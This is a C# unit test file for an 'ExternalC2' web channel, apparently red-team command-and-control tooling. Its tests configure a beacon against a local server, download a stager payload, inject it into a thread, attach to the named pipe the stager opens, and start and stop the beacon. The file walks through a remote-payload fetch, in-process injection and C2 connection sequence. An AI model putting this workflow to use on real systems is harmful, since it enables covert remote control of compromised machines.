using System;
using System.Threading;
using ExternalC2;
using ExternalC2.Channels;
using Microsoft.VisualStudio.TestTools.UnitTesting;

namespace ExternalC2Tests
{
    [TestClass]
    public class WebC2Tests
    {
        private readonly string _url = "http://127.0.0.1:50676/beacon"; // Set to ExternalC2Web dotnet server
        private WebC2 _beacon = new WebC2();

        [TestInitialize]
        public void Setup()
        {
            _beacon = new WebC2();
        }

        [TestMethod]
        public void BeaconCanConstruct()
        {
            WebC2 beacon = null;
            try
            {
                // Instantiate a configured beacon
                beacon = new WebC2(_url);

                // Check that the channels were instaniated
                Assert.IsInstanceOfType(beacon.BeaconChannel, typeof(BeaconChannel));
                Assert.IsInstanceOfType(beacon.ServerChannel, typeof(WebChannel));

                // Check that the property values are correct
                Assert.IsNotNull(beacon.UrlEndpoint);
                Assert.AreEqual(_url, beacon.UrlEndpoint);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
            finally
            {
                // Test specific clean up
                if (beacon != null && beacon.Started) beacon.Stop();
            }
        }

        [TestMethod]
        public void BeaconCanConfigure()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Check that the channels were instaniated
                Assert.IsInstanceOfType(_beacon.BeaconChannel, typeof(BeaconChannel));
                Assert.IsInstanceOfType(_beacon.ServerChannel, typeof(WebChannel));

                // Check that the property values are correct
                Assert.IsNotNull(_beacon.UrlEndpoint);
                Assert.AreEqual(_url, _beacon.UrlEndpoint);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanConnectToServer()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Connect to socket server
                _beacon.ServerChannel.Connect();

                // Check if connection was successful
                Assert.IsTrue(_beacon.ServerChannel.Connected);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanGetStager()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Connect to socket server
                _beacon.ServerChannel.Connect();
                Assert.IsTrue(_beacon.ServerChannel.Connected);

                // Get stager from socket
                var stager = _beacon.ServerChannel
                    .GetStager(_beacon.PipeName.ToString(), _beacon.Is64Bit);

                // Check if stager byte array length is correct
                // This might need to be a +/- range for variations of stager
                if (_beacon.Is64Bit)
                    Assert.IsTrue(stager.Length == 257024); // 64bit length
                else
                    Assert.IsTrue(stager.Length == 206848); // 32bit length
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanInjectStager()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Connect to socket server
                _beacon.ServerChannel.Connect();
                Assert.IsTrue(_beacon.ServerChannel.Connected);

                // Get stager from socket
                var stager = _beacon.ServerChannel
                    .GetStager(_beacon.PipeName.ToString(), _beacon.Is64Bit);
                if (_beacon.Is64Bit)
                    Assert.IsTrue(stager.Length == 257024); // 64bit length
                else
                    Assert.IsTrue(stager.Length == 206848); // 32bit length

                // Inject stager
                var threadId = _beacon.InjectStager(stager);

                // Check Thread ID is not 0
                Assert.IsTrue(threadId != 0);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanConnectToPipe()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Connect to socket server
                _beacon.ServerChannel.Connect();
                Assert.IsTrue(_beacon.ServerChannel.Connected);

                // Get stager from socket
                var stager = _beacon.ServerChannel
                    .GetStager(_beacon.PipeName.ToString(), _beacon.Is64Bit);
                if (_beacon.Is64Bit)
                    Assert.IsTrue(stager.Length == 257024); // 64bit length
                else
                    Assert.IsTrue(stager.Length == 206848); // 32bit length

                // Inject stager
                var threadId = _beacon.InjectStager(stager);
                Assert.IsTrue(threadId != 0);

                // Connect to beacon channel (namedpipe started by stager)
                _beacon.BeaconChannel.Connect();

                // Check beacon is connected
                Assert.IsTrue(_beacon.BeaconChannel.Connected);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanInitialize()
        {
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Initialize beacon
                var initialized = _beacon.Initialize();

                // Check initialize returned true
                Assert.IsTrue(initialized);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
        }

        [TestMethod]
        public void BeaconCanGo()
        {
            Thread beaconThread = null;
            try
            {
                // Configure beacon
                _beacon.Configure(_url);
                _beacon.Go();

                // Create new thread, start beacon
                beaconThread = new Thread(() => _beacon.Go());
                beaconThread.Start();

                // Give beacon time to connect
                Thread.Sleep(2000);

                // Assert beacon started correct
                Assert.IsTrue(_beacon.Started);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
            finally
            {
                if (beaconThread != null && beaconThread.IsAlive)
                    beaconThread.Abort();
            }
        }

        [TestMethod]
        public void BeaconCanStop()
        {
            Thread beaconThread = null;
            try
            {
                // Configure beacon
                _beacon.Configure(_url);

                // Create new thread, start beacon
                beaconThread = new Thread(() => _beacon.Go());
                beaconThread.Start();

                // Give beacon time to connect
                Thread.Sleep(2000);

                // Assert beacon started correct
                Assert.IsTrue(_beacon.Started);

                // Stop beacon
                _beacon.Stop();

                // Check if C2 channels closed
                Assert.IsFalse(_beacon.BeaconChannel.Connected);
                Assert.IsFalse(_beacon.ServerChannel.Connected);

                // Check if started bool is false
                Assert.IsFalse(_beacon.Started);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed: {ex.Message}");
                Assert.Fail();
            }
            finally
            {
                if (beaconThread != null && beaconThread.IsAlive)
                    beaconThread.Abort();
            }
        }

        [TestCleanup]
        public void Cleanup()
        {
            // Cleanup beacon if it started
            if (_beacon.Started)
                _beacon.Stop();

            // Cleanup C2 channels if connected
            if (_beacon.ServerChannel != null && _beacon.ServerChannel.Connected)
                _beacon.ServerChannel.Close();

            if (_beacon.BeaconChannel != null && _beacon.BeaconChannel.Connected)
                _beacon.BeaconChannel.Close();
        }
    }
}